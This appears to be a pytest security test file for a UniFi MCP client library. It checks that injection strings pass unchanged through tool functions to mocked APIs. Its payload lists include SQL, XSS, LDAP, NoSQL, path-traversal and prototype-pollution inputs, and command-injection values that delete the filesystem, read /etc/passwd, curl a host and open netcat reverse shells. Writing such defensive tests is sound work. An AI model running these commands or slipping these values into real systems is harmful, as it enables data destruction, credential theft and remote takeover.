"""Security tests for input validation and sanitization."""

from unittest.mock import AsyncMock, Mock

import httpx
import pytest

from unifi_mcp.clients.base_client import BaseUniFiClient
from unifi_mcp.clients.network_client import NetworkClient
from unifi_mcp.tools.access_tools import (
    get_unifi_access_logs,
    get_unifi_access_points,
    get_unifi_access_users,
    set_unifi_access_schedule,
    unlock_unifi_door,
)
from unifi_mcp.tools.network_tools import (
    disable_unifi_ap,
    enable_unifi_ap,
    get_unifi_clients,
    get_unifi_devices,
    get_unifi_sites,
    get_unifi_statistics,
    get_unifi_wlans,
    restart_unifi_device,
)


class TestInputValidationSecurity:
    """Test security aspects of input validation."""

    async def test_sql_injection_in_site_id(self):
        """Test that SQL injection attempts in site_id are handled safely."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.get_devices = AsyncMock(return_value=[])

        # SQL injection attempts
        malicious_site_ids = [
            "default'; DROP TABLE devices; --",
            "default' OR '1'='1",
            "default'; EXEC xp_cmdshell('dir'); --",
            "default' UNION SELECT * FROM users--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ]

        for site_id in malicious_site_ids:
            result = await get_unifi_devices(mock_client, site_id)
            # The site_id should be passed through as-is to the API
            # The API should handle sanitization
            mock_client.get_devices.assert_called_with(site_id)

    async def test_xss_in_device_identifiers(self):
        """Test that XSS attempts in device identifiers are handled safely."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.restart_device = AsyncMock(return_value={"result": "success"})

        # XSS attempts
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        ]

        for xss_payload in xss_payloads:
            result = await restart_unifi_device(mock_client, xss_payload, "default")
            # Payloads should be passed through to API which handles sanitization
            mock_client.restart_device.assert_called_with(xss_payload, "default")

    async def test_command_injection_in_user_input(self):
        """Test that command injection attempts are handled safely."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.get_clients = AsyncMock(return_value=[])

        # Command injection attempts
        command_injection_payloads = [
            "default; rm -rf /",
            "default | cat /etc/passwd",
            "default && curl malicious.com",
            "default`whoami`",
            "default$(nc -e /bin/sh 10.0.0.1 4444)",
            "default'; nc -e /bin/sh 10.0.0.1 4444; #",
        ]

        for payload in command_injection_payloads:
            result = await get_unifi_clients(mock_client, payload)
            # Payloads passed through to API (should be handled by server-side validation)
            mock_client.get_clients.assert_called_with(payload)

    async def test_path_traversal_in_identifiers(self):
        """Test that path traversal attempts are handled safely."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.disable_ap = AsyncMock(return_value={"result": "success"})

        # Path traversal attempts
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for payload in path_traversal_payloads:
            result = await disable_unifi_ap(mock_client, payload, "default")
            # Payloads passed through to API
            mock_client.disable_ap.assert_called_with(payload, "default")

    async def test_ldap_injection_in_user_data(self):
        """Test that LDAP injection attempts are handled safely."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.get_clients = AsyncMock(return_value=[])

        # LDAP injection attempts
        ldap_payloads = [
            "*)(uid=*",
            "*)(&(uid=*",
            "*)(|(password=*",
            "admin))(&",
            "*))%00",
            "*)%00",
        ]

        for payload in ldap_payloads:
            result = await get_unifi_clients(mock_client, payload)
            mock_client.get_clients.assert_called_with(payload)


class TestMACAddressValidation:
    """Test MAC address validation and sanitization."""

    async def test_valid_mac_addresses(self):
        """Test that valid MAC address formats are accepted."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.restart_device = AsyncMock(return_value={"result": "success"})

        valid_mac_addresses = [
            "aa:bb:cc:dd:ee:ff",  # Colon-separated
            "AA:BB:CC:DD:EE:FF",  # Uppercase
            "aabb.ccdd.eeff",  # Cisco format
            "aa-bb-cc-dd-ee-ff",  # Hyphen-separated
            "AA-BB-CC-DD-EE-FF",  # Uppercase with hyphens
        ]

        for mac in valid_mac_addresses:
            result = await restart_unifi_device(mock_client, mac, "default")
            mock_client.restart_device.assert_called_with(mac, "default")

    async def test_invalid_mac_addresses(self):
        """Test that invalid MAC addresses are handled."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.restart_device = AsyncMock(return_value={"result": "success"})

        invalid_mac_addresses = [
            "gg:gg:gg:gg:gg:gg",  # Invalid hex characters
            "aa:bb:cc:dd:ee",  # Too short
            "aa:bb:cc:dd:ee:ff:gg",  # Too long
            "aa-bb-cc-dd-ee",  # Wrong format
            "",  # Empty string
            "not-a-mac",  # Invalid format
            "00:00:00:00:00:00:00:00",  # Too many octets
        ]

        for mac in invalid_mac_addresses:
            # Should pass through to API which handles validation
            result = await restart_unifi_device(mock_client, mac, "default")
            mock_client.restart_device.assert_called_with(mac, "default")


class TestAccessScheduleValidation:
    """Test access schedule input validation."""

    async def test_malicious_schedule_payloads(self):
        """Test that malicious schedule payloads are handled."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.set_access_schedule = AsyncMock(return_value={"result": "success"})

        # Malicious payloads
        malicious_schedules = [
            {"__proto__": {"admin": True}},  # Prototype pollution
            {"constructor": {"prototype": {"admin": True}}},
            {"monday": {"start": "../etc/passwd", "end": "17:00"}},
            {"tuesday": {"start": "09:00", "end": "<script>alert('XSS')</script>"}},
            {"$where": "this.username == 'admin'"},  # NoSQL injection
        ]

        for schedule in malicious_schedules:
            result = await set_unifi_access_schedule(mock_client, "user123", schedule)
            mock_client.set_access_schedule.assert_called_with("user123", schedule)


class TestHTTPHeaderSecurity:
    """Test HTTP header security."""

    async def test_csrf_token_header_injection(self):
        """Test that CSRF tokens are properly handled in headers."""
        client = BaseUniFiClient(
            host="unifi.example.com",
            port=8443,
            username="admin",
            password="password123",
        )

        # Set malicious CSRF token
        client._csrf_token = "<script>alert('XSS')</script>"
        client._authenticated = True

        mock_response = Mock()
        mock_response.json.return_value = {"status": "success"}
        mock_response.raise_for_status.return_value = None
        mock_response.status_code = 200
        mock_response.text = ""

        client.client.request = AsyncMock(return_value=mock_response)

        result = await client._make_request("GET", "/api/test")

        # Verify the malicious token is passed (should be sanitized by server)
        call_args = client.client.request.call_args
        headers = call_args.kwargs.get("headers", {})
        assert headers.get("X-CSRF-Token") == "<script>alert('XSS')</script>"

    async def test_user_agent_injection(self):
        """Test that User-Agent header cannot be injected."""
        client = BaseUniFiClient(
            host="unifi.example.com",
            port=8443,
            username="admin",
            password="password123",
        )

        # Check that User-Agent is set correctly
        assert "User-Agent" in client.client.headers
        assert client.client.headers["User-Agent"] == "UniFi-MCP-Client/1.0"


class TestRequestBodySanitization:
    """Test request body sanitization."""

    async def test_json_payload_injection(self):
        """Test that JSON payload injection attempts are handled."""
        client = BaseUniFiClient(
            host="unifi.example.com",
            port=8443,
            username="admin",
            password="password123",
        )

        client._authenticated = True

        mock_response = Mock()
        mock_response.json.return_value = {"status": "success"}
        mock_response.raise_for_status.return_value = None
        mock_response.status_code = 200
        mock_response.text = ""

        client.client.request = AsyncMock(return_value=mock_response)

        # Malicious JSON data
        malicious_data = {
            "username": "admin",
            "password": {"$regex": ".*"},  # NoSQL injection
            "__proto__": {"admin": True},  # Prototype pollution
        }

        result = await client._make_request("POST", "/api/test", data=malicious_data)

        # Verify data is passed through (server should validate)
        call_args = client.client.request.call_args
        assert call_args.kwargs.get("json") == malicious_data


class TestAuthenticationSecurity:
    """Test authentication security."""

    async def test_empty_credentials(self):
        """Test handling of empty credentials."""
        # BaseUniFiClient currently accepts empty credentials
        # Validation happens at the config level, not client level
        client = BaseUniFiClient(
            host="unifi.example.com",
            port=8443,
            username="",  # Empty username
            password="",  # Empty password
        )
        # Client is created but will fail when trying to authenticate
        assert client.username == ""
        assert client.password == ""

    async def test_extremely_long_credentials(self):
        """Test handling of extremely long credentials (buffer overflow attempt)."""
        long_string = "a" * 100000  # 100KB string

        # BaseUniFiClient currently accepts very long strings
        # This tests that it doesn't crash with large inputs
        client = BaseUniFiClient(
            host="unifi.example.com",
            port=8443,
            username=long_string,
            password=long_string,
        )
        # Client is created but will fail when trying to connect
        assert client.username == long_string
        assert client.password == long_string


class TestURLSecurity:
    """Test URL security."""

    def test_base_url_construction(self):
        """Test that base URLs are constructed safely."""
        # Test with various host formats
        hosts = [
            "unifi.example.com",
            "192.168.1.1",
            "localhost",
            "127.0.0.1",
            "[::1]",  # IPv6
        ]

        for host in hosts:
            client = BaseUniFiClient(
                host=host,
                port=8443,
                username="admin",
                password="password123",
            )

            # Verify base_url is properly formatted
            assert client.base_url.startswith("https://")
            assert str(client.port) in client.base_url
            assert host.replace("[", "").replace("]", "") in client.base_url


class TestAccessControlSecurity:
    """Test access control and authorization."""

    async def test_unauthorized_device_restart(self):
        """Test attempting to restart a device without proper authentication."""
        mock_client = Mock(spec=NetworkClient)
        mock_client._authenticated = False
        mock_client.restart_device = AsyncMock(
            side_effect=Exception("Unauthorized")
        )

        with pytest.raises(Exception):
            await restart_unifi_device(
                mock_client, "aa:bb:cc:dd:ee:ff", "default"
            )

    async def test_access_schedule_for_nonexistent_user(self):
        """Test setting schedule for nonexistent user."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.set_access_schedule = AsyncMock(
            side_effect=Exception("User not found")
        )

        with pytest.raises(Exception):
            await set_unifi_access_schedule(
                mock_client, "nonexistent_user_id", {"monday": {"start": "09:00"}}
            )


class TestRateLimitingSecurity:
    """Test rate limiting and DoS protection."""

    async def test_rapid_requests(self):
        """Test handling of rapid requests (potential DoS)."""
        mock_client = Mock(spec=NetworkClient)
        mock_client.get_devices = AsyncMock(return_value=[])

        # Simulate rapid requests
        import asyncio

        tasks = [get_unifi_devices(mock_client, "default") for _ in range(100)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Some requests might fail if rate limiting is in place
        # But the client should handle it gracefully
        assert len(results) == 100


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
